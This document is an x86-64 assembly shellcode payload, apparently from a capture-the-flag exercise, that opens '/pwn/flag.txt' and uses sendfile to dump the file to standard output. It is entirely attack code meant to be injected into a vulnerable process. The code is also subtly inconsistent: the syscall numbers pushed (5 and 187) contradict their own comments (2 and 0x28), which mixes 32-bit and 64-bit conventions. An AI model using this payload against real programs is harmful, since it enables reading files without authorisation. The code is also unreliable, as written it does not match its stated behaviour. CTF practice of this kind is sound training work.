       1: .section .shellcode,"awx"
       2: .global _start
       3: .global __start
       4: .p2align 2
       5: _start:
       6: __start:
       7: .intel_syntax noprefix
       8:     /* push b'/pwn/flag.txt\x00' */
       9:     mov rax, 0x101010101010101
      10:     push rax
      11:     mov rax, 0x101010101010101 ^ 0x7478742e67
      12:     xor [rsp], rax
      13:     mov rax, 0x616c662f6e77702f
      14:     push rax
      15:     /* call open('rsp', 'O_RDONLY', 'rdx') */
      16:     push 5 /* 2 */
      17:     pop rax
      18:     mov rdi, rsp
      19:     xor esi, esi /* O_RDONLY */
      20:     syscall
      21:     /* call sendfile(1, 'rax', 0, 0x7fffffff) */
      22:     mov r10d, 0x7fffffff
      23:     mov rsi, rax
      24:     push 187 /* 0x28 */
      25:     pop rax
      26:     push 1
      27:     pop rdi
      28:     cdq /* rdx=0 */
      29:     syscall
